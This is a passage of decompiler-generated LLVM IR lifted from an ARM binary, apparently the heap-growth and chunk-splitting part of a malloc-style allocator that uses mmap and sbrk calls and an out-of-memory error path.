  %v3_11e88 = and i32 %v2_11e88, %v3_11e84
  store i32 %v3_11e88, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_11e6c
  %v0_11e8c.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_11e8c = phi i32 [ %v0_11e8c.pr, %.thread29thread-pre-split ], [ %v3_11e88, %bb155 ]
  %v2_11e8c = icmp ugt i32 %v0_11e8c, 1048575
  br i1 %v2_11e8c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_11ea4 = phi i32 [ %v0_11e8c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_11e94 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_11ea4, %v1_11e94
  br i1 %tmp214, label %dec_label_pc_11e9c, label %dec_label_pc_12100

dec_label_pc_11e9c:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_11ea4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11eb8 = call i32 @function_13b24(i32 0, i32 %v0_11ea4, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11eb8, i32* %r0.global-to-local, align 4
  %v3_11ebc = icmp eq i32 %v6_11eb8, -1
  %v8_11ebc = icmp eq i32 %v6_11eb8, -1
  store i32 %v6_11eb8, i32* @r4, align 4
  br i1 %v8_11ebc, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_11e9c
  %v1_11ec4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ec4 = add i32 %v1_11ec4, 864
  %v3_11ec4 = inttoptr i32 %v2_11ec4 to i32*
  %v4_11ec4 = load i32, i32* %v3_11ec4, align 4
  %v2_11ec8 = load i32, i32* @r5, align 4
  %v3_11ec8 = add i32 %v2_11ec8, %v6_11eb8
  store i32 %v3_11ec8, i32* %r0.global-to-local, align 4
  %v2_11ecc = and i32 %v4_11ec4, -2
  store i32 %v2_11ecc, i32* %r3.global-to-local, align 4
  store i32 %v2_11ecc, i32* %v3_11ec4, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_11e9c, %bb158
  br i1 %v3_11ebc, label %dec_label_pc_11ed8, label %dec_label_pc_11edc

dec_label_pc_11ed8:                               ; preds = %.thread32, %dec_label_pc_11e58
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %.thread32, %dec_label_pc_11ed8
  %v0_11edc = load i32, i32* @r4, align 4
  %v7_11edc = icmp eq i32 %v0_11edc, -1
  br i1 %v7_11edc, label %dec_label_pc_12100, label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11edc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r2.global-to-local, align 4
  %v4_11eec = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11eec, i32* %ip.global-to-local, align 4
  store i32 %v3_11e1c, i32* %r2.global-to-local, align 4
  %v1_11ef4 = add i32 %v4_11eec, 872
  %v2_11ef4 = inttoptr i32 %v1_11ef4 to i32*
  %v3_11ef4 = load i32, i32* %v2_11ef4, align 4
  %v1_11ef8 = load i32, i32* @r8, align 4
  %v2_11ef8 = add i32 %v1_11ef8, %v3_11e1c
  store i32 %v2_11ef8, i32* %r1.global-to-local, align 4
  %v0_11efc = load i32, i32* @r5, align 4
  %v2_11efc = add i32 %v0_11efc, %v3_11ef4
  store i32 %v2_11efc, i32* %r3.global-to-local, align 4
  %v9_11f00 = icmp eq i32 %v0_11edc, %v2_11ef8
  br i1 %v9_11f00, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_11ee4
  store i32 %v2_11efc, i32* %v2_11ef4, align 4
  br label %dec_label_pc_11f1c

bb159:                                            ; preds = %dec_label_pc_11ee4
  %v1_11f04 = load i32, i32* %r0.global-to-local, align 4
  %v8_11f04 = icmp eq i32 %v1_11f04, -1
  store i32 %v2_11efc, i32* %v2_11ef4, align 4
  br i1 %v8_11f04, label %.thread34, label %dec_label_pc_11f1c

.thread34:                                        ; preds = %bb159
  %v1_11f0c = load i32, i32* @r5, align 4
  %v2_11f0c = load i32, i32* @r8, align 4
  %v3_11f0c = add i32 %v2_11f0c, %v1_11f0c
  %v2_11f10 = or i32 %v3_11f0c, 1
  store i32 %v2_11f10, i32* %r3.global-to-local, align 4
  %v2_11f14 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f14 = add i32 %v2_11f14, 4
  %v4_11f14 = inttoptr i32 %v3_11f14 to i32*
  store i32 %v2_11f10, i32* %v4_11f14, align 4
  br label %dec_label_pc_12094

dec_label_pc_11f1c:                               ; preds = %bb159, %.thread122
  %v0_11f20.pr = load i32, i32* @r8, align 4
  %v0_11f1c = load i32, i32* %ip.global-to-local, align 4
  %v1_11f1c = add i32 %v0_11f1c, 864
  %v2_11f1c = inttoptr i32 %v1_11f1c to i32*
  %v3_11f1c = load i32, i32* %v2_11f1c, align 4
  store i32 %v3_11f1c, i32* %r2.global-to-local, align 4
  %v2_11f20 = icmp eq i32 %v0_11f20.pr, 0
  br i1 %v2_11f20, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_11f1c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_11f1c
  %v2_11f28 = urem i32 %v3_11f1c, 2
  store i32 %v2_11f28, i32* %r3.global-to-local, align 4
  %v2_11f2c = icmp eq i32 %v2_11f28, 0
  br i1 %v2_11f2c, label %.thread40, label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %.thread36
  %v0_11f34 = load i32, i32* @r4, align 4
  %v1_11f34 = load i32, i32* %r1.global-to-local, align 4
  %v3_11f34 = icmp ult i32 %v0_11f34, %v1_11f34
  br i1 %v3_11f34, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_11f34
  %v2_11f38 = and i32 %v3_11f1c, -2
  store i32 %v2_11f38, i32* %r3.global-to-local, align 4
  store i32 %v2_11f38, i32* %v2_11f1c, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_11f34, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v4_11f48 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11f48, i32* @r7, align 4
  %v1_11f4c = add i32 %v4_11f48, 864
  %v2_11f4c = inttoptr i32 %v1_11f4c to i32*
  %v3_11f4c = load i32, i32* %v2_11f4c, align 4
  store i32 %v3_11f4c, i32* %r3.global-to-local, align 4
  %v1_11f50 = urem i32 %v3_11f4c, 2
  store i32 %v1_11f50, i32* @r6, align 4
  %v2_11f50 = icmp eq i32 %v1_11f50, 0
  br i1 %v2_11f50, label %dec_label_pc_11fe4, label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %.thread40
  %v0_11f58 = load i32, i32* @r8, align 4
  %v2_11f58 = icmp eq i32 %v0_11f58, 0
  br i1 %v2_11f58, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_11f58
  %v2_11f5c = add i32 %v4_11f48, 872
  %v3_11f5c = inttoptr i32 %v2_11f5c to i32*
  %v4_11f5c = load i32, i32* %v3_11f5c, align 4
  store i32 %v4_11f5c, i32* %r2.global-to-local, align 4
  %v1_11f60 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f60 = load i32, i32* @r4, align 4
  %v3_11f60 = sub i32 %v2_11f60, %v1_11f60
  %v3_11f64 = add i32 %v3_11f60, %v4_11f5c
  store i32 %v3_11f64, i32* %r3.global-to-local, align 4
  store i32 %v3_11f64, i32* %v3_11f5c, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11f58, %bb161
  %v0_11f6c = load i32, i32* @r4, align 4
  %v1_11f6c = urem i32 %v0_11f6c, 8
  store i32 %v1_11f6c, i32* %r3.global-to-local, align 4
  %v2_11f6c = icmp eq i32 %v1_11f6c, 0
  br i1 %v2_11f6c, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_11f70 = sub nsw i32 8, %v1_11f6c
  store i32 %v2_11f70, i32* %r3.global-to-local, align 4
  %v3_11f74 = add i32 %v2_11f70, %v0_11f6c
  store i32 %v3_11f74, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_11f7c = phi i32 [ 0, %.thread43 ], [ %v2_11f70, %bb162 ]
  %v1_11f78 = load i32, i32* @r5, align 4
  %v2_11f78 = add i32 %v1_11f78, %v0_11f6c
  store i32 %v2_11f78, i32* @r6, align 4
  %v1_11f7c = load i32, i32* @r8, align 4
  %v2_11f7c = add i32 %v2_11f78, %v0_11f7c
  %v2_11f80 = add i32 %v2_11f7c, %v1_11f7c
  store i32 %v2_11f80, i32* %r1.global-to-local, align 4
  %v1_11f84 = load i32, i32* %sb.global-to-local, align 4
  %v2_11f84 = add i32 %v1_11f84, %v2_11f80
  %v1_11f88 = load i32, i32* %fp.global-to-local, align 4
  %v2_11f88 = and i32 %v1_11f88, %v2_11f84
  store i32 %v2_11f88, i32* %r2.global-to-local, align 4
  %v2_11f8c = sub i32 0, %v2_11f78
  store i32 %v2_11f8c, i32* %r3.global-to-local, align 4
  %v2_11f90 = sub i32 %v2_11f88, %v2_11f78
  store i32 %v2_11f90, i32* @r5, align 4
  store i32 %v2_11f90, i32* %r0.global-to-local, align 4
  br i1 %v2_11f6c, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_11f6c, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_11f9c = call i32 @function_13db0(i32 %v2_11f90)
  store i32 %v1_11f9c, i32* %r0.global-to-local, align 4
  %v3_11fa0 = icmp eq i32 %v1_11f9c, -1
  br i1 %v3_11fa0, label %dec_label_pc_11fa8, label %dec_label_pc_11fb8

dec_label_pc_11fa8:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11fac = call i32 @function_13db0(i32 0)
  store i32 %v1_11fac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12010

dec_label_pc_11fb8:                               ; preds = %bb164
  %v1_11fb8 = load i32, i32* @r4, align 4
  %v3_11fb8 = icmp ult i32 %v1_11f9c, %v1_11fb8
  br i1 %v3_11fb8, label %dec_label_pc_11fc0, label %dec_label_pc_12010

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11fb8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r0.global-to-local, align 4
  %v4_11fc8 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11fc8, i32* %r2.global-to-local, align 4
  %v1_11fcc = add i32 %v4_11fc8, 864
  %v2_11fcc = inttoptr i32 %v1_11fcc to i32*
  %v3_11fcc = load i32, i32* %v2_11fcc, align 4
  %v0_11fd0 = load i32, i32* @r6, align 4
  store i32 %v0_11fd0, i32* %r0.global-to-local, align 4
  %v1_11fd4 = and i32 %v3_11fcc, -2
  store i32 %v1_11fd4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_11fd4, i32* %v2_11fcc, align 4
  br label %dec_label_pc_12010

dec_label_pc_11fe4:                               ; preds = %.thread40
  %v0_11fe4 = load i32, i32* %r0.global-to-local, align 4
  %v3_11fe4 = icmp eq i32 %v0_11fe4, -1
  br i1 %v3_11fe4, label %dec_label_pc_11fec, label %dec_label_pc_12008

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fe4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11ff0 = call i32 @function_13db0(i32 0)
  store i32 %v1_11ff0, i32* %r0.global-to-local, align 4
  %v0_11ff4 = load i32, i32* @r7, align 4
  %v1_11ff4 = add i32 %v0_11ff4, 872
  %v2_11ff4 = inttoptr i32 %v1_11ff4 to i32*
  %v3_11ff4 = load i32, i32* %v2_11ff4, align 4
  store i32 %v3_11ff4, i32* %r2.global-to-local, align 4
  %v0_11ff8 = load i32, i32* @r4, align 4
  %v0_11ffc = load i32, i32* @r5, align 4
  %v2_11ff8 = add i32 %v3_11ff4, %v1_11ff0
  %v2_11ffc = sub i32 %v2_11ff8, %v0_11ff8
  %v2_12000 = sub i32 %v2_11ffc, %v0_11ffc
  store i32 %v2_12000, i32* %r3.global-to-local, align 4
  store i32 %v2_12000, i32* %v2_11ff4, align 4
  %v0_1200c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_11fe4, %dec_label_pc_11fec
  %v0_1200c = phi i32 [ 0, %dec_label_pc_11fe4 ], [ %v0_1200c.pre, %dec_label_pc_11fec ]
  %v0_12008 = load i32, i32* @r4, align 4
  store i32 %v0_12008, i32* @r7, align 4
  store i32 %v0_1200c, i32* @r5, align 4
  br label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %dec_label_pc_11fb8, %dec_label_pc_11fc0, %dec_label_pc_11fa8, %dec_label_pc_12008
  %v0_12010 = load i32, i32* %r0.global-to-local, align 4
  %v7_12010 = icmp eq i32 %v0_12010, -1
  br i1 %v7_12010, label %dec_label_pc_12094, label %dec_label_pc_12018

dec_label_pc_12018:                               ; preds = %dec_label_pc_12010
  %v1_12018 = load i32, i32* @r5, align 4
  %v2_12018 = add i32 %v1_12018, %v0_12010
  %v0_1201c = load i32, i32* @r7, align 4
  %v2_1201c = sub i32 %v2_12018, %v0_1201c
  %v1_12020 = or i32 %v2_1201c, 1
  %v2_12024 = add i32 %v0_1201c, 4
  %v3_12024 = inttoptr i32 %v2_12024 to i32*
  store i32 %v1_12020, i32* %v3_12024, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12030 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_12030, i32* @r6, align 4
  %v1_12034 = add i32 %v4_12030, 872
  %v2_12034 = inttoptr i32 %v1_12034 to i32*
  %v3_12034 = load i32, i32* %v2_12034, align 4
  %v0_12038 = load i32, i32* @r8, align 4
  %v2_12038 = icmp eq i32 %v0_12038, 0
  %v0_1203c = load i32, i32* @r5, align 4
  %v2_1203c = add i32 %v0_1203c, %v3_12034
  store i32 %v2_1203c, i32* %r3.global-to-local, align 4
  store i32 %v2_1203c, i32* %v2_12034, align 4
  %v0_12044 = load i32, i32* @r7, align 4
  %v1_12044 = load i32, i32* @r6, align 4
  %v2_12044 = add i32 %v1_12044, 44
  %v3_12044 = inttoptr i32 %v2_12044 to i32*
  store i32 %v0_12044, i32* %v3_12044, align 4
  br i1 %v2_12038, label %dec_label_pc_12094, label %dec_label_pc_1204c

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12018
  %v0_12050 = load i32, i32* @r8, align 4
  %v1_12050 = add i32 %v0_12050, -12
  %v1_12054 = and i32 %v1_12050, -8
  store i32 %v3_11e1c, i32* %ip.global-to-local, align 4
  %v2_1205c = add i32 %v1_12054, %v3_11e1c
  store i32 %v2_1205c, i32* %r1.global-to-local, align 4
  %v2_12060 = icmp ugt i32 %v1_12054, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12068 = or i32 %v1_12054, 1
  store i32 %v1_12068, i32* %r3.global-to-local, align 4
  store i32 %v1_12068, i32* %v2_11e28, align 4
  %v0_12070 = load i32, i32* %r2.global-to-local, align 4
  %v1_12070 = load i32, i32* %r1.global-to-local, align 4
  %v2_12070 = add i32 %v1_12070, 8
  %v3_12070 = inttoptr i32 %v2_12070 to i32*
  store i32 %v0_12070, i32* %v3_12070, align 4
  %v0_12074 = load i32, i32* %r2.global-to-local, align 4
  %v1_12074 = load i32, i32* %r1.global-to-local, align 4
  %v2_12074 = add i32 %v1_12074, 4
  %v3_12074 = inttoptr i32 %v2_12074 to i32*
  store i32 %v0_12074, i32* %v3_12074, align 4
  br i1 %v2_12060, label %dec_label_pc_1207c, label %dec_label_pc_12094

dec_label_pc_1207c:                               ; preds = %dec_label_pc_1204c
  %v0_1207c = load i32, i32* @r6, align 4
  %v1_1207c = add i32 %v0_1207c, 836
  %v2_1207c = inttoptr i32 %v1_1207c to i32*
  %v3_1207c = load i32, i32* %v2_1207c, align 4
  store i32 %v3_1207c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12084 = load i32, i32* %ip.global-to-local, align 4
  %v1_12084 = add i32 %v0_12084, 8
  store i32 %v1_12084, i32* @r0, align 4
  store i32 -1, i32* %v2_1207c, align 4
  %v0_1208c = call i32 @function_128a8()
  store i32 %v0_1208c, i32* %r0.global-to-local, align 4
  %v0_12090 = load i32, i32* @r4, align 4
  %v1_12090 = load i32, i32* @r6, align 4
  %v2_12090 = add i32 %v1_12090, 836
  %v3_12090 = inttoptr i32 %v2_12090 to i32*
  store i32 %v0_12090, i32* %v3_12090, align 4
  br label %dec_label_pc_12094

dec_label_pc_12094:                               ; preds = %.thread34, %dec_label_pc_1204c, %dec_label_pc_12018, %dec_label_pc_12010, %dec_label_pc_1207c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r0.global-to-local, align 4
  %v4_1209c = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_1209c, i32* %lr.global-to-local, align 4
  %v1_120a0 = add i32 %v4_1209c, 872
  store i32 %v1_120a0, i32* %r1.global-to-local, align 4
  %v1_120a4 = inttoptr i32 %v1_120a0 to i32*
  %v2_120a4 = load i32, i32* %v1_120a4, align 4
  store i32 %v2_120a4, i32* %r1.global-to-local, align 4
  %v3_120a4 = add i32 %v4_1209c, 876
  %v4_120a4 = inttoptr i32 %v3_120a4 to i32*
  %v5_120a4 = load i32, i32* %v4_120a4, align 4
  store i32 %v5_120a4, i32* %r3.global-to-local, align 4
  %v1_120ac = add i32 %v4_1209c, 868
  %v2_120ac = inttoptr i32 %v1_120ac to i32*
  %v3_120ac = load i32, i32* %v2_120ac, align 4
  store i32 %v3_120ac, i32* %r3.global-to-local, align 4
  %v1_120b0 = add i32 %v4_1209c, 884
  %v2_120b0 = inttoptr i32 %v1_120b0 to i32*
  %v3_120b0 = load i32, i32* %v2_120b0, align 4
  store i32 %v3_120b0, i32* %r2.global-to-local, align 4
  %v2_120b4 = add i32 %v3_120ac, %v2_120a4
  store i32 %v2_120b4, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_120a4, %v5_120a4
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_12094
  store i32 %v2_120a4, i32* %v4_120a4, align 4
  %v0_120bc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_120bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_12094, %bb165
  %v1_120bc = phi i32 [ %v3_120b0, %dec_label_pc_12094 ], [ %v1_120bc.pre, %bb165 ]
  %v4_120c0 = phi i32 [ %v2_120b4, %dec_label_pc_12094 ], [ %v0_120bc.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_120c0, %v1_120bc
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_120c0 = load i32, i32* %lr.global-to-local, align 4
  %v6_120c0 = add i32 %v5_120c0, 884
  %v7_120c0 = inttoptr i32 %v6_120c0 to i32*
  store i32 %v4_120c0, i32* %v7_120c0, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_120c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_120c4 = add i32 %v0_120c4, 44
  %v2_120c4 = inttoptr i32 %v1_120c4 to i32*
  %v3_120c4 = load i32, i32* %v2_120c4, align 4
  store i32 %v3_120c4, i32* %ip.global-to-local, align 4
  %v1_120c8 = add i32 %v3_120c4, 4
  %v2_120c8 = inttoptr i32 %v1_120c8 to i32*
  %v3_120c8 = load i32, i32* %v2_120c8, align 4
  store i32 %v1_11cdc, i32* %r1.global-to-local, align 4
  %v1_120d0 = and i32 %v3_120c8, -4
  store i32 %v1_120d0, i32* %r3.global-to-local, align 4
  %v3_120d4 = icmp ult i32 %v1_120d0, %v1_11cdc
  br i1 %v3_120d4, label %dec_label_pc_12100, label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %bb168
  %v0_120dc = load i32, i32* @sl, align 4
  %v2_120dc = sub i32 %v1_120d0, %v0_120dc
  %v2_120e0 = add i32 %v0_120dc, %v3_120c4
  store i32 %v2_120e0, i32* %r1.global-to-local, align 4
  %v1_120e4 = or i32 %v2_120dc, 1
  store i32 %v1_120e4, i32* %r3.global-to-local, align 4
  %v1_120e8 = or i32 %v0_120dc, 1
  store i32 %v1_120e8, i32* %r2.global-to-local, align 4
  %v1_120ec = add i32 %v3_120c4, 8
  store i32 %v1_120ec, i32* %r0.global-to-local, align 4
  store i32 %v1_120e8, i32* %v2_120c8, align 4
  %v0_120f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_120f4 = load i32, i32* %lr.global-to-local, align 4
  %v2_120f4 = add i32 %v1_120f4, 44
  %v3_120f4 = inttoptr i32 %v2_120f4 to i32*
  store i32 %v0_120f4, i32* %v3_120f4, align 4
  %v0_120f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_120f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_120f8 = add i32 %v1_120f8, 4
  %v3_120f8 = inttoptr i32 %v2_120f8 to i32*
  store i32 %v0_120f8, i32* %v3_120f8, align 4
  br label %dec_label_pc_12110

dec_label_pc_12100:                               ; preds = %bb157, %bb168, %dec_label_pc_11edc
  %v0_12100 = call i32 @function_11204()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_12108 = inttoptr i32 %v0_12100 to i32*
  store i32 12, i32* %v2_12108, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %bb151, %bb150, %dec_label_pc_120dc, %dec_label_pc_11d24, %dec_label_pc_12100
  %v0_12110 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12110, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %.thread1, %dec_label_pc_11cf0, %.thread121, %dec_label_pc_11b60, %dec_label_pc_11b54, %dec_label_pc_119bc, %dec_label_pc_11940, %dec_label_pc_12110
  store i32 %v2_11868, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 124820, i32* %r2.global-to-local, align 4
  %v4_12124 = load i32, i32* inttoptr (i32 124844 to i32*), align 4
  store i32 %v4_12124, i32* @ip, align 4
  store i32 74032, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12124)
  br label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %dec_label_pc_118a0, %dec_label_pc_12114
  %v0_12130 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12130, i32* %r0.global-to-local, align 4
  store i32 %v3_1183c, i32* @r4, align 4
  store i32 %v6_1183c, i32* @r5, align 4
  store i32 %v9_1183c, i32* @r6, align 4
  store i32 %v12_1183c, i32* @r7, align 4
  store i32 %v15_1183c, i32* @r8, align 4
  store i32 %v18_1183c, i32* @sb, align 4
  store i32 %v21_1183c, i32* @sl, align 4
  store i32 %v24_1183c, i32* @fp, align 4
  store i32 %v27_1183c, i32* @lr, align 4
  ret i32 %v0_12130

; uselistorder directives
  uselistorder i32 %v0_120dc, { 1, 0, 2 }
  uselistorder i32 %v3_120c4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_120c0, { 1, 0 }
  uselistorder i32 %v2_120a4, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1209c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12054, { 1, 2, 0 }
  uselistorder i32 %v0_1201c, { 1, 0 }
  uselistorder i32 %v0_12010, { 1, 0 }
  uselistorder i32 %v2_12000, { 1, 0 }
  uselistorder i32 %v2_11f90, { 2, 1, 0 }
  uselistorder i32 %v2_11f78, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11f70, { 1, 0, 2 }
  uselistorder i32 %v1_11f6c, { 2, 1, 0 }
  uselistorder i32 %v0_11f6c, { 3, 1, 2, 0 }
  uselistorder i32 %v1_11f50, { 1, 0 }
  uselistorder i32 %v2_11f28, { 1, 0 }
  uselistorder i32 %v3_11f1c, { 1, 0, 2 }
  uselistorder i32 %v2_11efc, { 1, 0, 2 }
  uselistorder i32* %v2_11ef4, { 1, 0, 2 }
  uselistorder i32 %v0_11edc, { 1, 0 }
  uselistorder i32 %v6_11eb8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11ea4, { 2, 1, 0 }
  uselistorder i32 %v0_11e8c, { 1, 0 }
  uselistorder i32 %v2_11e48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e44, { 1, 0 }
  uselistorder i32 %v3_11e1c, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11dfc, { 1, 0, 2 }
  uselistorder i32 %v2_11de4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11d8c, { 2, 1, 0 }
  uselistorder i32 %v6_11d80, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11d5c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11d1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11cdc, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11cd4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11cd0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11cbc, { 1, 0 }
  uselistorder i32 %v7_11c7c, { 1, 0 }
  uselistorder i32 %v4_11c7c, { 1, 0 }
  uselistorder i32 %v0_11c4c, { 1, 0 }
  uselistorder i32 %v2_11c20, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_11c1c54, { 1, 0 }
  uselistorder i32 %v1_11be8, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11bd0., { 1, 2, 0 }
  uselistorder i32 %v0_11bd8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11bd8, { 1, 0 }
  uselistorder i32 %v3_11bb8, { 1, 0 }
  uselistorder i32 %v4_11bb4, { 1, 0, 2 }
  uselistorder i32 %v1_11b24, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b7c, { 1, 0 }
  uselistorder i32 %v1_11b60, { 1, 0 }
  uselistorder i32 %v1_11a00, { 1, 0 }
  uselistorder i32 %v0_11b40, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11b08, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11b9c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11ae4, { 2, 1, 0 }
  uselistorder i32 %v3_11ad8, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_119f8, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11aa0, { 1, 0 }
  uselistorder i32 %v3_11a94, { 1, 0 }
  uselistorder i32 %v0_11aa0, { 1, 0 }
  uselistorder i32 %v3_11a78, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11a68, { 1, 0, 2 }
  uselistorder i32 %v3_11a20, { 2, 1, 0 }
  uselistorder i32 %v0_11a10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_119e0, { 1, 0 }
  uselistorder i32 %v1_11994, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11990, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11934, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11928, { 1, 0 }
  uselistorder i32 %v3_118f8, { 1, 0 }
  uselistorder i32 %v0_118ec, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_118cc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_118c0, { 1, 0 }
  uselistorder i32 %v0_11898, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
